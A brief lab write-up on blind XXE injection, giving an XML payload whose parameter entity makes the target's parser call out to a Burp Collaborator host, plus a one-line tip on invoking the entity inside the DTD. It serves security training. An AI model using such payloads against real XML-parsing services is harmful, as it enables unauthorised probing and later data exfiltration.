# Lab: Blind XXE with out-of-band interaction via XML parameter entities

This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.

To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

----

payload
```<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE mydoc [<!ENTITY % xxe SYSTEM "http://sad.burpcollaborator.net/" > `%xxe;` ]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>```

envoking the entity in it's tag is the trick here !!
